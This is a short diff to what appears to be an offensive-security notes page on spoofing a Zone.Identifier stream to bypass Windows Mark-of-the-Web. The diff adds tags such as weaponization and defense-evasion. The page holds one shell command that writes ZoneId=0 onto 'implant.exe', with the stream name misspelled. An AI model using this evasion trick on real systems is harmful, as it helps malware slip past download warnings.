@@ -1,6 +1,15 @@
+---
+author(s):
+  - Userware
+tags:
+  - initial-access
+  - weaponization
+  - client-side-attacks
+  - defense-evasion
+  - scenarios
+  - windows
+---
 # 03 - Spoof ZoneTransfer (MOTW Bypass)
-
-Search Tag(s): #initial-access #defense-evasion #windows #scenarios
 
 ```
 $ echo -e "[ZoneTransfer]\nZoneId=0" > /mnt/ntfs/implant.exe:Zone.Identifer
